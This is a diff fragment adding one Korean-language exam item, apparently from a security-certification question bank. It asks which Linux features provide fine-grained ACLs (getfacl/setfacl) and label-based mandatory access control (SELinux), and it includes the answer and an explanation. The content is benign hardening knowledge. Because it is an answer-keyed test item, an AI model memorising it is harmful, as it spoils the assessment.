+      "id": "y-sys-022",
+      "type": "단답형",
+      "question": "리눅스 접근제어에 대한 물음이다.\n\n* 기존 소유자/그룹/기타 3분류 권한을 넘어, 개별 사용자·그룹 단위로 세밀한 권한을 부여하는 기능은 ( A ) 이며 `getfacl`/`setfacl` 로 관리한다.\n* 프로세스·파일에 보안 컨텍스트(레이블)를 부여해 정책 기반으로 강제 접근제어(MAC)를 수행하는 리눅스 커널 모듈은 ( B ) 이다.",
+      "answer": "정답\n(A) ACL (Access Control List) — POSIX ACL\n(B) SELinux (Security-Enhanced Linux)",
+      "explanation": "- **POSIX ACL**: `setfacl -m u:user1:rw file`. `ls -l` 에서 권한 뒤 `+` 표시.\n- **SELinux**: Type Enforcement 기반 MAC. `getenforce`(Enforcing/Permissive/Disabled), `ausearch`/`audit2allow` 로 정책 조정. 데비안 계열은 AppArmor(경로 기반). DAC 를 보완하는 강제적 통제.",
+      "notes": [
+        "시스템보안/유닉스-시스템-하드닝",
+        "정보보안일반/접근통제-모델"
+      ],
+      "tags": [
+        "ACL",
+        "SELinux",
+        "AppArmor",
+        "MAC"
+      ]
+    }
+  ]
+}
